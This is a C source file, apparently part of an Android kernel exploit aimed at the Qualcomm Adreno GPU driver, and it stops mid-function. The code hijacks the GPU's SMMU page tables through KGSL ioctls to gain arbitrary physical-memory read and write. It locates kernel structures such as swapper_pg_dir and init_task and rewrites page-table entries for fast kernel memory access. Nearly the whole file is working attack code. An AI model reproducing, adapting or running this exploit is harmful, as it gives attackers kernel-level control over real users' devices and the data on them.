#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/capability.h>
#include <setjmp.h>
#include <sched.h>

#define KALLSYMS_LOOKUP_INCLUDE
#include "kallsyms_lookup.c"

const uint64_t kFakeGpuAddr = 0x40403000;

static int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa);
static void sync_cache_to_gpu(void* start, void* end);
static void sync_cache_from_gpu(void* start, void* end);
static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values);
static int DoReadContiguous(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, uint64_t read_addr, uint32_t dword_count);


struct cheese_gpu_rw {
    int fd;
    uint32_t ctx_id;

    uint32_t* payload_buf;
    uint64_t payload_gpuaddr;
    uint32_t* output_buf;
    uint64_t output_gpuaddr;

    void* target_physical_page;

    uint64_t phyaddr;

    void* garbage;
    uint64_t swapper_pg_dir_phys; // Added for stabilization
    uint64_t init_task_phys;      // Added for stabilization
    uint64_t pte_a_index;
    uint64_t pte_addr_b;
    uint64_t original_pte_b;
    uint64_t kernel_base_pa;
    uint64_t kernel_size;
};

#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

// Page table constants for PTE calculation
#define PAGE_SHIFT 12
#define LEVEL_COUNT 4  // 4-level page table

// Helper function to compute page table index for a given address and level
static inline uint64_t compute_pt_index(uint64_t addr, int level) {
    uint64_t vpfn = addr >> PAGE_SHIFT;
    vpfn >>= (3 - level) * 9;
    return vpfn & 0x1FF;  // 9 bits for the index
}

// Kernel structure offsets
#define OFFSETOF_TASK_STRUCT_MM 0x518
#define OFFSETOF_MM_PGD 0x48

// Forward declarations
static int ReadPhys64(struct cheese_gpu_rw* cheese, uint64_t phys_addr, uint64_t* out_val);
static uint64_t walk_page_table_for_pte(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr);
static uint64_t get_mm_struct_from_task(struct cheese_gpu_rw* cheese, uint64_t task_struct_addr);
uint64_t kernel_pread_u64(struct cheese_gpu_rw* cheese, uint64_t paddr);
void kernel_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t paddr, uint64_t val);
uint64_t kernel_va_to_pa(struct cheese_gpu_rw* cheese, uint64_t kva);


const uint64_t kGarbageSize = 16 * 1024 * 1024;

// Global context for fast access
static struct {
    uint64_t* map;
    uint64_t* page_map;
    uint64_t pte_a_index;
    uint64_t original_pte_a;
    uint64_t pte_table_pa;
    bool initialized;
} g_fast_rw = {0};

void log_info(const char* format, ...) {
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    fprintf(stderr, "\n");
    va_end(args);
}

uint64_t phys_to_readwrite_pte(uint64_t pa) {
    uint64_t page_pa = pa & ~0xFFFULL;
    const uint64_t PA_FIELD_MASK = 0x0000FFFFFFFFF000ULL;
    uint64_t new_pte = (page_pa & PA_FIELD_MASK);
    new_pte |= 0x3;
    new_pte &= ~(1ULL << 7);
    new_pte |= (1ULL << 6);
    new_pte |= (1ULL << 10);
    return new_pte;
}

void flush_tlb() {
    __asm__ volatile(
        "dsb ishst\n"
        : : : "memory"
    );
    sched_yield();
    __asm__ volatile(
        "dsb ish\n"
        "isb\n"
        : : : "memory"
    );
}

static void flush_tlb_mprotect(void *addr, size_t len) {
    if (mprotect(addr, len, PROT_NONE) == -1) {
        return;
    }
    if (mprotect(addr, len, PROT_READ | PROT_WRITE) == -1) {
    }
}

// Complete function to walk the page table and find the final PTE that maps a virtual address
static int ReadPhys64(struct cheese_gpu_rw* cheese, uint64_t phys_addr, uint64_t* out_val) {
    uint32_t low, high;

    if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, phys_addr & ~0xfffull)) {
        return 1;
    }
    sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);

    // Read low 32 bits
    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr,
                cheese->phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false,
                kFakeGpuAddr + (phys_addr & 0xfffull), 1, NULL)) {
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    volatile uint32_t* result_marker = cheese->target_physical_page + 0x100;
    if (result_marker[0] != 0x41414141) {
        return 1;
    }
    low = *(volatile uint32_t*)(cheese->target_physical_page + 0x104);
    result_marker[0] = 0;
    sync_cache_to_gpu((void*)result_marker, (void*)(result_marker+1));

    // Read high 32 bits
    uint64_t high_addr = phys_addr + 4;
    if ((high_addr & ~0xfffull) != (phys_addr & ~0xfffull)) {
        if (setup_pagetables(cheese->target_physical_page, 1, cheese->phyaddr, kFakeGpuAddr, high_addr & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    }

    if (DoWrite(cheese->fd, cheese->ctx_id, cheese->payload_buf, cheese->payload_gpuaddr,
                cheese->phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false,
                kFakeGpuAddr + (high_addr & 0xfffull), 1, NULL)) {
        return 1;
    }
    sleep(1);
    sync_cache_from_gpu(cheese->target_physical_page, cheese->target_physical_page + 0x1000);
    if (result_marker[0] != 0x41414141) {
        return 1;
    }
    high = *(volatile uint32_t*)(cheese->target_physical_page + 0x104);

    *out_val = ((uint64_t)high << 32) | low;

    return 0;
}

// Function to properly walk page tables for 39-bit virtual addresses (typical on Android)
static uint64_t walk_page_table_for_pte(struct cheese_gpu_rw* cheese, uint64_t pgd_phys_addr, uint64_t virtual_addr) {
    // For 39-bit VA: 3-level page table
    // Level 1 (PGD): bits [38:30] - 9 bits, 512 entries
    uint64_t pgd_index = (virtual_addr >> 30) & 0x1FF;
    uint64_t pgd_entry_addr = pgd_phys_addr + (pgd_index * sizeof(uint64_t));

    fprintf(stderr, "walk_page_table: VA=0x%lx, PGD index=%lu, PGD entry addr=0x%lx\n",
            virtual_addr, pgd_index, pgd_entry_addr);

    uint64_t pgd_entry_val;
    if (ReadPhys64(cheese, pgd_entry_addr, &pgd_entry_val)) {
        fprintf(stderr, "walk_page_table: Failed to read PGD entry\n");
        return 0;
    }

    fprintf(stderr, "walk_page_table: PGD entry value=0x%lx\n", pgd_entry_val);

    // Check if entry is valid - bits [1:0] should be 0x3 for table descriptor
    if ((pgd_entry_val & 0x3) != 0x3) {
        fprintf(stderr, "walk_page_table: Invalid PGD entry (bits[1:0]=0x%lx, expected 0x3)\n",
                pgd_entry_val & 0x3);
        return 0;
    }

    // Extract PMD table address - bits [47:12]
    uint64_t pmd_addr = pgd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pmd_addr) {
        fprintf(stderr, "walk_page_table: Null PMD address\n");
        return 0;
    }

    // Level 2 (PMD): bits [29:21] - 9 bits
    uint64_t pmd_index = (virtual_addr >> 21) & 0x1FF;
    uint64_t pmd_entry_addr = pmd_addr + (pmd_index * sizeof(uint64_t));

    fprintf(stderr, "walk_page_table: PMD addr=0x%lx, PMD index=%lu, PMD entry addr=0x%lx\n",
            pmd_addr, pmd_index, pmd_entry_addr);

    uint64_t pmd_entry_val;
    if (ReadPhys64(cheese, pmd_entry_addr, &pmd_entry_val)) {
        fprintf(stderr, "walk_page_table: Failed to read PMD entry\n");
        return 0;
    }

    fprintf(stderr, "walk_page_table: PMD entry value=0x%lx\n", pmd_entry_val);

    // Check if it's a valid entry
    if ((pmd_entry_val & 0x1) == 0) {
        fprintf(stderr, "walk_page_table: Invalid PMD entry (bit 0 not set)\n");
        return 0;
    }

    // Check if it's a block mapping (2MB page) - bit[1] = 0 means block
    if ((pmd_entry_val & 0x3) == 0x1) {
        fprintf(stderr, "walk_page_table: PMD is a block descriptor (2MB page) - cannot get PTE\n");
        return 0;
    }

    // It's a table descriptor - extract PTE table address
    uint64_t pte_addr = pmd_entry_val & 0x0000FFFFFFFFF000ULL;
    if (!pte_addr) {
        fprintf(stderr, "walk_page_table: Null PTE address\n");
        return 0;
    }

    // Level 3 (PTE): bits [20:12] - 9 bits
    uint64_t pte_index = (virtual_addr >> 12) & 0x1FF;
    uint64_t target_pte_addr = pte_addr + (pte_index * sizeof(uint64_t));

    fprintf(stderr, "walk_page_table: PTE addr=0x%lx, PTE index=%lu, target PTE addr=0x%lx\n",
            pte_addr, pte_index, target_pte_addr);

    return target_pte_addr;
}

/* send pad IBs and a payload IB at a specific index to the GPU */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

#define NPBUFS 256

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* outer attributes */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint32_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
        level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                ENTRY_NG);
        for (int i = 0; i < 16; i++) {
            int index = level3_index + 2 + i;
            if (index == level1_index || index == level2_index || index == level3_index) {
                return -1;
            }
            level_base[index] = (uint64_t) (target_pa + (i*0x1000) | ENTRY_VALID | ENTRY_RW |
                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                ENTRY_NG);
        }
    }

    return 0;
}

// From Mesa/Freedreno/Turnip

static inline void
tu_sync_cacheline_to_gpu(void const *p __attribute__((unused)))
{
   __asm volatile("dc cvac, %0" : : "r" (p) : "memory");
}

static inline void
tu_sync_cacheline_from_gpu(void const *p __attribute__((unused)))
{
   __asm volatile("dc civac, %0" : : "r" (p) : "memory");
}

uint32_t
tu_get_l1_dcache_size()
{
   uint64_t ctr_el0;
   __asm__ volatile("mrs\t%x0, ctr_el0" : "=r"(ctr_el0));
   return 4 << ((ctr_el0 >> 16) & 0xf);
}

static uint64_t g_level1_dcache_size;

static void sync_cache_to_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_to_gpu(start);
    }
}

static void sync_cache_from_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_from_gpu(start);
    }
}

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_CONTEXT_SWITCH_YIELD 0x6b

#define CP_MEMCPY 0x75

static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);

    if (write) {
        *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
        drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
        for (int i = 0; i < count; i++) {
            *drawstate_cmds++ = values[i];
        }
    } else {
        if (count > 1) {
            for (int i = 0; i < count; i++) {
                *drawstate_cmds++ = cp_type7_packet(CP_MEMCPY, 5);
                *drawstate_cmds++ = 1;
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr + i*0x1000);
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4 + i*4);
            }
        } else {
            *drawstate_cmds++ = cp_type7_packet(CP_MEMCPY, 5);
            *drawstate_cmds++ = count;
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
        }
    }
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
    *drawstate_cmds++ = 0x41414141;

    uint32_t* payload_cmds = payload_buf;
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

    sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
    int err = kgsl_gpu_command_payload(fd, ctx_id, 0, 0, 1, 0, payload_gpuaddr, cmd_size);
    if (err) {
        return 1;
    }
    return 0;
}

const uint64_t gPhyAddrs[] = {0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};

int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
    uint64_t kernel_physical_memory_region = 0xA8000000;
    uint64_t kernel_read_offset = 0x4;
    uint64_t target_read_physical_address = kernel_physical_memory_region + kernel_read_offset;

    uint64_t phyaddr = 0xfebeb000;
    if (getenv("CHEESE_PHYADDR")) {
        phyaddr = strtoull(getenv("CHEESE_PHYADDR"), NULL, 0);
    } else if (getenv("CHEESE_ATTEMPT")) {
        phyaddr = gPhyAddrs[atoi(getenv("CHEESE_ATTEMPT"))];
    }

    uint64_t pbuf_len = PAGE_SIZE * 4096;
    uint8_t *pbufs[NPBUFS];

    for (int i = 0; i < NPBUFS; i++) {
        uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            fprintf(stderr, "pbuf mmap failed (%d)\n", i);
            return 1;
        }

        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull);

        if (ret == -1) {
            fprintf(stderr, "setup_pagetables failed\n");
            return 1;
        }

        pbufs[i] = pbuf;
        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
    }

    int fd = open("/dev/kgsl-3d0", O_RDWR|O_CLOEXEC);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
        fprintf(stderr, "Can't do first read\n");
    }
    sleep(1);

    void* target_physical_page = NULL;
    int target_pbuf = -1;

    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        for (int off = 0; off < pbuf_len; off += 4096) {
            void* page_start = pbuf + off;
            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
            uint32_t* target = page_start + 0x100;
            if (target[0] == 0x41414141) {
                fprintf(stderr, "found it: virt addr = %p\n", page_start);
                target_physical_page = page_start;
                target_pbuf = i;
            }
        }
    }

    if (target_pbuf == -1) {
        fprintf(stderr, "can't find target\n");
        return 1;
    }

    uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
    fprintf(stderr, "read output: %x\n", read_output);

    if (read_output == 0) {
        fprintf(stderr, "can't find kernel entry at %lx\n", target_read_physical_address);
        return 1;
    }

    uint32_t branch_off = read_output & ((1 << 26) - 1);
    uint64_t kernel_entry_file_off = kernel_read_offset + (branch_off << 2);
    fprintf(stderr, "kernel entry = %lx\n", kernel_physical_memory_region + kernel_entry_file_off);

    uint64_t swapper_pg_dir_off = 0;
    if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
        swapper_pg_dir_off = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
    } else {
        target_read_physical_address = kernel_physical_memory_region + kernel_entry_file_off - 0xf000 - 0x6000 + 2*sizeof(uint64_t);
        fprintf(stderr, "target_read_physical_address = %lx\n", target_read_physical_address);
        if (setup_pagetables(target_physical_page, 1,
        phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull)) {
            return 1;
        }
        sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
        if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, false, kFakeGpuAddr + 0x2000 + (target_read_physical_address & 0xfffull), 16, NULL)) {
            fprintf(stderr, "Can't do second read\n");
            return 1;
        }
        fprintf(stderr, "CP_MEMCPY read for swapper_pg_dir successful.\n");
        sleep(1);
        sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
        uint32_t second_read_sentinel = *(uint32_t*)(target_physical_page + 0x100);
        fprintf(stderr, "second read sentinel: %x\n", second_read_sentinel);
        if (second_read_sentinel != 0x41414141) {
            fprintf(stderr, "Fail\n");
            return 1;
        }

        for (int i = 15; i >= 0; i--) {
            read_output = *(uint32_t*)(target_physical_page + 0x104 + i*4);
            fprintf(stderr, "second read value: %x\n", read_output);
            if (read_output == 0x45454545) {
                fprintf(stderr, "Fail\n");
                return 1;
            }
            if ((read_output & 0xfff) == 0x3) {
                uint64_t idmap_pg_dir_off = kernel_entry_file_off - 0xf000 - 0x6000 + i*0x1000;
                swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
                fprintf(stderr, "found CHEESE_SWAPPER_PG_DIR_OFF=0x%lx\n", swapper_pg_dir_off);

                uint64_t init_task_off = idmap_pg_dir_off + 0x321F80;
                cheese->init_task_phys = kernel_physical_memory_region + init_task_off;
                fprintf(stderr, "Found init_task_phys: %#lx\n", cheese->init_task_phys);

                break;
            }
        }
        if (!swapper_pg_dir_off) {
            fprintf(stderr, "can't find swapper_pg_dir\n");
            return 1;
        }
        sleep(1);
    }

    uint64_t swapper_pg_dir_phys = kernel_physical_memory_region + swapper_pg_dir_off;
    cheese->swapper_pg_dir_phys = swapper_pg_dir_phys;
    fprintf(stderr, "Found swapper_pg_dir_phys: %#lx\n", swapper_pg_dir_phys);

    cheese->fd = fd;
    cheese->ctx_id = ctx_id;
    cheese->payload_buf = payload_buf;
    cheese->payload_gpuaddr = payload_gpuaddr;
    cheese->output_buf = output_buf;
    cheese->output_gpuaddr = output_gpuaddr;
    cheese->target_physical_page = target_physical_page;
    cheese->phyaddr = phyaddr;
    cheese->kernel_base_pa = kernel_physical_memory_region;

    // Don't unmap the buffer containing target_physical_page
    for (int i = 0; i < NPBUFS; i++) {
        if (i != target_pbuf) {  // Skip the buffer we're using
            munmap(pbufs[i], pbuf_len);
            pbufs[i] = NULL;
        }
    }
    return 0;
}

int cheese_shutdown(struct cheese_gpu_rw* cheese) {
    int err = kgsl_ctx_destroy(cheese->fd, cheese->ctx_id);
    if (err) {
        fprintf(stderr, "Can't destroy context: %s\n", strerror(err));
        return 1;
    }

    close(cheese->fd);
    return 0;
}

static uint64_t get_pgd_from_mm(struct cheese_gpu_rw* cheese, uint64_t mm_struct_pa) {
    uint64_t pgd_ptr_phys_addr = mm_struct_pa + OFFSETOF_MM_PGD;
    uint64_t pgd_va = 0;

    if (ReadPhys64(cheese, pgd_ptr_phys_addr, &pgd_va)) {
        fprintf(stderr, "get_pgd_from_mm: Failed to read pgd field from mm_struct\n");
        return 0;
    }

    if (pgd_va == 0) {
        fprintf(stderr, "get_pgd_from_mm: pgd VA is null\n");
        return 0;
    }

    fprintf(stderr, "Found PGD at virtual address: 0x%lx\n", pgd_va);

    uint64_t pgd_pa = kernel_va_to_pa(cheese, pgd_va);
    if (pgd_pa == 0) {
        fprintf(stderr, "get_pgd_from_mm: failed to convert PGD VA to PA\n");
        return 0;
    }

    fprintf(stderr, "Converted PGD VA to PA: 0x%lx\n", pgd_pa);
    return pgd_pa;
}

static uint64_t get_mm_struct_from_task(struct cheese_gpu_rw* cheese, uint64_t task_struct_addr) {
    uint64_t mm_field_addr = task_struct_addr + OFFSETOF_TASK_STRUCT_MM;
    uint64_t mm_struct_addr = 0;

    if (ReadPhys64(cheese, mm_field_addr, &mm_struct_addr)) {
        fprintf(stderr, "get_mm_struct_from_task: Failed to read mm field from task_struct\n");
        return 0;
    }

    fprintf(stderr, "Found mm_struct at virtual address: 0x%lx\n", mm_struct_addr);
    return mm_struct_addr;
}

static int init_fast_rw(struct cheese_gpu_rw* cheese) {
    if (!cheese->garbage || !cheese->target_physical_page) {
        log_info("init_fast_rw: garbage mapping not set up");
        return 1;
    }

    g_fast_rw.map = (uint64_t*)cheese->garbage;
    g_fast_rw.page_map = (uint64_t*)((char*)g_fast_rw.map + PAGE_SIZE);
    g_fast_rw.pte_a_index = cheese->pte_a_index;
    g_fast_rw.original_pte_a = g_fast_rw.page_map[g_fast_rw.pte_a_index];

    uint64_t pte_b_value = g_fast_rw.page_map[g_fast_rw.pte_a_index + 1];
    g_fast_rw.pte_table_pa = pte_b_value & 0x0000FFFFFFFFF000ULL;

    log_info("Fast RW initialized: map=%p, page_map=%p, pte_a_index=%lu", g_fast_rw.map, g_fast_rw.page_map, g_fast_rw.pte_a_index);

    g_fast_rw.initialized = true;
    return 0;
}

static uint64_t fast_pread_u64(struct cheese_gpu_rw* cheese, uint64_t pa) {
    if (!g_fast_rw.initialized) {
        if (init_fast_rw(cheese)) {
            return 0;
        }
    }

    uint64_t target_page = pa & ~0xFFFULL;
    uint64_t offset = pa & 0xFFFULL;
    uint64_t new_pte = phys_to_readwrite_pte(target_page);

    g_fast_rw.page_map[g_fast_rw.pte_a_index] = new_pte;
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);

    uint64_t val = *(volatile uint64_t*)((char*)g_fast_rw.map + offset);

    g_fast_rw.page_map[g_fast_rw.pte_a_index] = g_fast_rw.original_pte_a;
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);

    return val;
}

static void fast_pwrite_u64(struct cheese_gpu_rw* cheese, uint64_t pa, uint64_t val) {
    if (!g_fast_rw.initialized) {
        if (init_fast_rw(cheese)) {
            return;
        }
    }

    uint64_t target_page = pa & ~0xFFFULL;
    uint64_t offset = pa & 0xFFFULL;
    uint64_t new_pte = phys_to_readwrite_pte(target_page);

    g_fast_rw.page_map[g_fast_rw.pte_a_index] = new_pte;
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);

    *(volatile uint64_t*)((char*)g_fast_rw.map + offset) = val;

    g_fast_rw.page_map[g_fast_rw.pte_a_index] = g_fast_rw.original_pte_a;
    flush_tlb_mprotect(g_fast_rw.map, PAGE_SIZE);
}

static void fast_pwrite_bytes(struct cheese_gpu_rw* cheese, uint64_t pa, void* data, size_t size) {
    if (!g_fast_rw.initialized) {
        if (init_fast_rw(cheese)) {
            return;
        }
    }

    uint64_t current_pa = pa;
    char* data_buf = (char*)data;
    size_t remaining = size;

    while (remaining > 0) {
        uint64_t target_page = current_pa & ~0xFFFULL;
        uint64_t offset = current_pa & 0xFFFULL;

        uint64_t new_pte = phys_to_readwrite_pte(target_page);

        g_fast_rw.page_map[g_fast_rw.pte_a_index] = new_pte;
        flush_tlb();

        size_t to_write = 0x1000 - offset;
        if (to_write > remaining) {
            to_write = remaining;
        }

        void* write_addr = (char*)g_fast_rw.map + offset;
        
        memcpy(write_addr, data_buf, to_write);

        // Clean D-cache to PoU so it's visible to instruction fetches
